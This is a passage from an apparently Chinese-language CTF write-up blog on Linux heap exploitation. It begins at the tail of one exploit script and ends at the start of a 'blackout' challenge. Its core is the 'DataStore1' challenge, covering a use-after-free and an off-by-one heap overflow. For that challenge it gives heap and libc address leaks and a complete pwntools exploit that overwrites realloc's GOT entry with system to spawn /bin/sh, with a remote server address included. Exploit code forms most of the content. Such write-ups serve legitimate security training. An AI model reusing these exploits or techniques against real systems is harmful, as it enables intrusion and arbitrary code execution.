class="line">canary_libc = libc_base - <span class="number">0x2897</span></span><br><span class="line">success(<span class="string">&quot;system_libc &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(system_libc))</span><br><span class="line">success(<span class="string">&quot;dup2_libc &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(dup2_libc))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;2&quot;</span>*<span class="number">0x20</span>+p64(main_addr)+p64(main_addr)+p64(libc_start_main)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;1&quot;</span>*<span class="number">0x20</span>+<span class="string">&quot;2&quot;</span>*<span class="number">0x20</span>+p64(bss_addr)+p64(bss_addr)+p64(gets_libc)</span><br><span class="line">p.send(payload)</span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">sl(<span class="string">&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;2&quot;</span>*<span class="number">0x20</span>+p64(<span class="number">0</span>)+p64(bss_addr)+p64(execve_libc)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="DataStore1"><a href="#DataStore1" class="headerlink" title="DataStore1"></a>DataStore1</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">GNU C <span class="title">Library</span> <span class="params">(Ubuntu GLIBC <span class="number">2.35</span><span class="number">-0u</span>buntu3<span class="number">.1</span>)</span> stable release version 2.35.</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">chall: ELF <span class="number">64</span>-bit LSB shared object, x86<span class="number">-64</span>, version <span class="number">1</span> (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86<span class="number">-64.</span>so<span class="number">.2</span>, BuildID[sha1]=f7db7c5af40bd044bf0bc48be35bc65a1d1a08a0, <span class="keyword">for</span> GNU/Linux <span class="number">3.2</span><span class="number">.0</span>, <span class="keyword">not</span> stripped</span><br><span class="line">    Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>
<ul>
<li>64位，dynamically，全开</li>
</ul>
<p><strong>程序分析</strong></p>
<p>本题目给了源码：</p>
<ul>
<li>create 模块会要求输入 Type 以表示数据的类型</li>
<li>edit 模块会根据不同的 Type 来调用不同的函数</li>
</ul>
<p>程序中有一句 <code>scanf(&quot;%70m[^\n]%*c&quot;, &amp;buf)</code>，它的基础逻辑就是读取最多70字节到 buf，但在内存中程序会先申请 0x70 大小的 chunk，然后调用 realloc 将其调整为合适大小的 chunk：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: <span class="number">0x55bfa12cb3c0</span></span><br><span class="line">Size: <span class="number">0x71</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">Free <span class="title">chunk</span> <span class="params">(tcache)</span> | PREV_INUSE</span></span><br><span class="line"><span class="function">Addr: 0x55bfa12cb3e0</span></span><br><span class="line"><span class="function">Size: 0x51</span></span><br><span class="line"><span class="function">fd: 0x55bfa12cb</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">Allocated chunk | PREV_INUSE</span></span><br><span class="line"><span class="function">Addr: 0x55bfa12cb430</span></span><br><span class="line"><span class="function">Size: 0x21</span></span><br></pre></td></tr></table></figure>
<p><strong>漏洞分析</strong></p>
<p>有 UAF 漏洞：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">remove_recursive</span><span class="params">(<span class="keyword">data_t</span> *data)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!data)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span>(data-&gt;type)&#123;</span><br><span class="line">        <span class="keyword">case</span> TYPE_ARRAY:</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">arr_t</span> *arr = data-&gt;p_arr;</span><br><span class="line">                <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;arr-&gt;count; i++)</span><br><span class="line">                    <span class="keyword">if</span>(remove_recursive(&amp;arr-&gt;data[i]))</span><br><span class="line">                        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">                <span class="built_in">free</span>(arr);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> TYPE_STRING:</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">str_t</span> *str = data-&gt;p_str;</span><br><span class="line">                <span class="built_in">free</span>(str-&gt;content);</span><br><span class="line">                <span class="built_in">free</span>(str);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    data-&gt;type = TYPE_EMPTY;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>堆溢出漏洞：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> idx = getint();</span><br><span class="line"><span class="keyword">if</span>(idx &gt; arr-&gt;count)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br></pre></td></tr></table></figure>
<p><strong>入侵思路</strong></p>
<p>核心思路就是利用堆溢出来修改相邻下一个 chunk 的数据：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="string">&quot;a&quot;</span>,<span class="number">0x6</span>)</span><br><span class="line">arr_update(<span class="number">0</span>,<span class="string">&quot;a&quot;</span>,<span class="number">0x6</span>)</span><br><span class="line">arr_update(<span class="number">1</span>,<span class="string">&quot;a&quot;</span>,<span class="number">0x6</span>)</span><br><span class="line">arr_delete(<span class="number">0x6</span>)</span><br><span class="line">arr_update(<span class="number">0x6</span>,<span class="string">&quot;v&quot;</span>,<span class="string">&quot;64&quot;</span>)</span><br></pre></td></tr></table></figure>
<ul>
<li>如果数据类型为 array，则程序会在 chunk 的第一片8字节空间中写入该 array 的大小</li>
<li>利用堆溢出可以修改 array-&gt;size，从而引发更大范围的堆溢出</li>
</ul>
<p>下面是泄露堆地址的样例：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="string">&quot;a&quot;</span>,<span class="number">0x6</span>)</span><br><span class="line">arr_update(<span class="number">0</span>,<span class="string">&quot;a&quot;</span>,<span class="number">0x6</span>) <span class="comment"># array0</span></span><br><span class="line">arr_update(<span class="number">1</span>,<span class="string">&quot;v&quot;</span>,<span class="string">&quot;a&quot;</span>*<span class="number">8</span>) <span class="comment"># string1</span></span><br><span class="line">arr_update(<span class="number">2</span>,<span class="string">&quot;a&quot;</span>,<span class="number">0x10</span>) <span class="comment"># array2</span></span><br><span class="line">arr_delete2(<span class="number">0</span>,<span class="number">6</span>)</span><br><span class="line">arr_delete(<span class="number">0x6</span>)</span><br><span class="line">arr_update(<span class="number">0x6</span>,<span class="string">&quot;v&quot;</span>,<span class="string">&quot;8&quot;</span>)</span><br><span class="line">arr_update2(<span class="number">0</span>,<span class="number">6</span>,<span class="string">&quot;v&quot;</span>,<span class="string">&quot;a&quot;</span>*<span class="number">8</span>)</span><br><span class="line">cmd(<span class="number">2</span>)</span><br><span class="line">ru(<span class="string">&quot;[01] &lt;S&gt; &quot;</span>)</span><br><span class="line">leak_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">heap_base = leak_addr - <span class="number">0x540</span></span><br><span class="line">success(<span class="string">&quot;leak_addr &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">success(<span class="string">&quot;heap_base &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(heap_base))</span><br></pre></td></tr></table></figure>
<ul>
<li>通过堆溢出扩大 array0-&gt;size，从而使其可以访问到 string1-&gt;data</li>
<li>通过 <code>arr_update2(0,6,&quot;a&quot;,0x10)</code> 申请 array1-6 实际上溢出到了 string1-&gt;data 的区域，并往 string1-&gt;data 中写入了一个堆地址</li>
</ul>
<p>现在可以通过修改 string1-&gt;data 来间接修改 array1-6，接着我们需要释放大量 chunk 以得到 unsorted chunk，并伪造好 array1-6 的结构，再次打印时就可以泄露 libc_base 了：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    arr_update2(<span class="number">2</span>,i,<span class="string">&quot;a&quot;</span>,<span class="number">0x10</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">    arr_delete2(<span class="number">2</span>,i)</span><br><span class="line"></span><br><span class="line">arr_update2(<span class="number">2</span>,<span class="number">10</span>,<span class="string">&quot;v&quot;</span>,<span class="built_in">str</span>(heap_base+<span class="number">0xe00</span>))</span><br><span class="line">str_update(<span class="number">1</span>,p64(heap_base+<span class="number">0x4e0</span>-<span class="number">8</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line"></span><br><span class="line">cmd(<span class="number">2</span>)</span><br><span class="line">ru(<span class="string">&quot;[06] &lt;S&gt; &quot;</span>)</span><br><span class="line">leak_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">libc_base = leak_addr - <span class="number">0x219ce0</span></span><br><span class="line">success(<span class="string">&quot;leak_addr &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">success(<span class="string">&quot;libc_base &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br></pre></td></tr></table></figure>
<p>完成泄露以后，我们可以劫持 libc GOT，在 <code>realloc@got[plt]</code> 中写入 <code>system</code> 即可</p>
<p>完整 exp 如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">arch = <span class="number">64</span></span><br><span class="line">challenge = <span class="string">&#x27;./chall1&#x27;</span></span><br><span class="line"></span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">64</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">32</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;i386&#x27;</span></span><br><span class="line"></span><br><span class="line">elf = ELF(challenge)</span><br><span class="line">libc = ELF(<span class="string">&#x27;libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">rl = <span class="keyword">lambda</span>    a=<span class="literal">False</span>        : p.recvline(a)</span><br><span class="line">ru = <span class="keyword">lambda</span> a,b=<span class="literal">True</span>    : p.recvuntil(a,b)</span><br><span class="line">rn = <span class="keyword">lambda</span> x            : p.recvn(x)</span><br><span class="line">sn = <span class="keyword">lambda</span> x            : p.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x            : p.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> a,b            : p.sendafter(a,b)</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b        : p.sendlineafter(a,b)</span><br><span class="line">irt = <span class="keyword">lambda</span>            : p.interactive()</span><br><span class="line">dbg = <span class="keyword">lambda</span> text=<span class="literal">None</span>  : gdb.attach(p, text)</span><br><span class="line"><span class="comment"># lg = lambda s,addr        : log.info(&#x27;33[1;31;40m %s --&gt; 0x%x 33[0m&#x27; % (s,addr))</span></span><br><span class="line">lg = <span class="keyword">lambda</span> s            : log.info(<span class="string">&#x27;33[1;31;40m %s --&gt; 0x%x 33[0m&#x27;</span> % (s, <span class="built_in">eval</span>(s)))</span><br><span class="line">uu32 = <span class="keyword">lambda</span> data        : u32(data.ljust(<span class="number">4</span>, <span class="string">b&#x27;x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> data        : u64(data.ljust(<span class="number">8</span>, <span class="string">b&#x27;x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">b = <span class="string">&quot;set debug-file-directory ./.debug/\n&quot;</span></span><br><span class="line"></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    p = process(challenge)</span><br><span class="line">    <span class="comment">#p = gdb.debug(challenge, b)</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;119.13.105.35&#x27;</span>,<span class="string">&#x27;10111&#x27;</span>)</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span>():</span></span><br><span class="line">    <span class="comment">#gdb.attach(p,&quot;b* 0x401184\nb* 0x40116C\n&quot;)</span></span><br><span class="line">    gdb.attach(p,<span class="string">&quot;b *$rebase(0x17F3)\n&quot;</span>)</span><br><span class="line">    <span class="comment">#pause()</span></span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmd</span>(<span class="params">op</span>):</span></span><br><span class="line">    sla(<span class="string">&quot;&gt;&quot;</span>,<span class="built_in">str</span>(op))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params"><span class="built_in">type</span>,data</span>):</span></span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line">    sla(<span class="string">&quot;&gt;&quot;</span>,<span class="built_in">type</span>)</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">type</span> == <span class="string">&quot;a&quot;</span>):</span><br><span class="line">        sla(<span class="string">&quot;input size:&quot;</span>,<span class="built_in">str</span>(data))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        sla(<span class="string">&quot;input value:&quot;</span>,data)</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">1. Update</span></span><br><span class="line"><span class="string">2. Delete</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">arr_update</span>(<span class="params">index,<span class="built_in">type</span>,data</span>):</span></span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line">    sla(<span class="string">&quot;index:&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    sla(<span class="string">&quot;&gt;&quot;</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    sla(<span class="string">&quot;&gt;&quot;</span>,<span class="built_in">type</span>)</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">type</span> == <span class="string">&quot;a&quot;</span>):</span><br><span class="line">        sla(<span class="string">&quot;input size:&quot;</span>,<span class="built_in">str</span>(data))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        sla(<span class="string">&quot;input value:&quot;</span>,data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">arr_delete</span>(<span class="params">index</span>):</span></span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line">    sla(<span class="string">&quot;index:&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    sla(<span class="string">&quot;&gt;&quot;</span>,<span class="string">&quot;2&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">arr_update2</span>(<span class="params">index,index2,<span class="built_in">type</span>,data</span>):</span></span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line">    sla(<span class="string">&quot;index:&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line">    sla(<span class="string">&quot;index:&quot;</span>,<span class="built_in">str</span>(index2))</span><br><span class="line">    sla(<span class="string">&quot;&gt;&quot;</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    sla(<span class="string">&quot;&gt;&quot;</span>,<span class="built_in">type</span>)</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">type</span> == <span class="string">&quot;a&quot;</span>):</span><br><span class="line">        sla(<span class="string">&quot;input size:&quot;</span>,<span class="built_in">str</span>(data))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        sla(<span class="string">&quot;input value:&quot;</span>,data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">arr_delete2</span>(<span class="params">index,index2</span>):</span></span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line">    sla(<span class="string">&quot;index:&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line">    sla(<span class="string">&quot;index:&quot;</span>,<span class="built_in">str</span>(index2))</span><br><span class="line">    sla(<span class="string">&quot;&gt;&quot;</span>,<span class="string">&quot;2&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">str_update</span>(<span class="params">index,data</span>):</span></span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line">    sla(<span class="string">&quot;index:&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    sla(<span class="string">&quot;&gt;&quot;</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    sa(<span class="string">&quot;bytes):&quot;</span>,data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">str_update2</span>(<span class="params">index,index2,data</span>):</span></span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line">    sla(<span class="string">&quot;index:&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line">    sla(<span class="string">&quot;index:&quot;</span>,<span class="built_in">str</span>(index2))</span><br><span class="line">    sla(<span class="string">&quot;&gt;&quot;</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    sa(<span class="string">&quot;bytes):&quot;</span>,data)</span><br><span class="line"></span><br><span class="line">add(<span class="string">&quot;a&quot;</span>,<span class="number">0x6</span>)</span><br><span class="line">arr_update(<span class="number">0</span>,<span class="string">&quot;a&quot;</span>,<span class="number">0x6</span>)</span><br><span class="line">arr_update(<span class="number">1</span>,<span class="string">&quot;v&quot;</span>,<span class="string">&quot;a&quot;</span>*<span class="number">8</span>)</span><br><span class="line">arr_update(<span class="number">2</span>,<span class="string">&quot;a&quot;</span>,<span class="number">0x10</span>)</span><br><span class="line">arr_delete2(<span class="number">0</span>,<span class="number">6</span>)</span><br><span class="line">arr_delete(<span class="number">0x6</span>)</span><br><span class="line">arr_update(<span class="number">0x6</span>,<span class="string">&quot;v&quot;</span>,<span class="string">&quot;8&quot;</span>)</span><br><span class="line">arr_update2(<span class="number">0</span>,<span class="number">6</span>,<span class="string">&quot;v&quot;</span>,<span class="string">&quot;a&quot;</span>*<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">cmd(<span class="number">2</span>)</span><br><span class="line">ru(<span class="string">&quot;[01] &lt;S&gt; &quot;</span>)</span><br><span class="line">leak_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">heap_base = leak_addr - <span class="number">0x540</span></span><br><span class="line">success(<span class="string">&quot;leak_addr &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">success(<span class="string">&quot;heap_base &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(heap_base))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    arr_update2(<span class="number">2</span>,i,<span class="string">&quot;a&quot;</span>,<span class="number">0x10</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">    arr_delete2(<span class="number">2</span>,i)</span><br><span class="line"></span><br><span class="line">arr_update2(<span class="number">2</span>,<span class="number">10</span>,<span class="string">&quot;v&quot;</span>,<span class="built_in">str</span>(heap_base+<span class="number">0xe00</span>))</span><br><span class="line">str_update(<span class="number">1</span>,p64(heap_base+<span class="number">0x4e0</span>-<span class="number">8</span>))</span><br><span class="line"></span><br><span class="line">cmd(<span class="number">2</span>)</span><br><span class="line">ru(<span class="string">&quot;[06] &lt;S&gt; &quot;</span>)</span><br><span class="line">leak_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">libc_base = leak_addr - <span class="number">0x219ce0</span></span><br><span class="line">success(<span class="string">&quot;leak_addr &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">success(<span class="string">&quot;libc_base &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">realloc_libc_got = libc_base + <span class="number">0x219028</span></span><br><span class="line">system_libc = libc_base + libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">one_gadgets = [<span class="number">0x50a37</span>,<span class="number">0xebcf1</span>,<span class="number">0xebcf5</span>,<span class="number">0xebcf8</span>,<span class="number">0xebd52</span>,<span class="number">0xebdaf</span>,<span class="number">0xebdb3</span>]</span><br><span class="line">one_gadget = libc_base + one_gadgets[<span class="number">2</span>]</span><br><span class="line">success(<span class="string">&quot;realloc_libc_got &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(realloc_libc_got))</span><br><span class="line"></span><br><span class="line">arr_update2(<span class="number">2</span>,<span class="number">10</span>,<span class="string">&quot;v&quot;</span>,p64(<span class="number">0x50</span>)+p64(realloc_libc_got))</span><br><span class="line">str_update(<span class="number">1</span>,p64(heap_base+<span class="number">0xe00</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">str_update2(<span class="number">0</span>,<span class="number">6</span>,p64(system_libc))</span><br><span class="line">arr_update(<span class="number">3</span>,<span class="string">&quot;v&quot;</span>,<span class="string">&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="blackout"><a href="#blackout" class="headerlink" title="blackout"></a>blackout</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">GNU C <span class="title">Library</span> <span class="params">(Ubuntu GLIBC <span class="number">2.35</span><span class="number">-0u</span>buntu3<span class="number">.3</span>)</span> stable release version 2.35.</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">blackout: ELF <span class="number">64</span>-bit LSB executable, x86<span class="number">-64</span>, version <span class="number">1</span> (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86<span class="number">-64.</span>so<span class="number">.2</span>, BuildID[sha1]=<span class="number">4</span>c3a010b465f17f8212ac92f19b5b63be856f16b, <span class="keyword">for</span> GNU/Linux <span class="number">3.2</span><span class="number">.0</span>, <span class="keyword">not</span> stripped</span><br><span class="line">    Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (<span class="number">0x400000</span>)</span><br></pre></td></tr></table></figure>
<ul>
<li>64位，dynamically，Full RELRO，Canary，NX</li>
</ul>
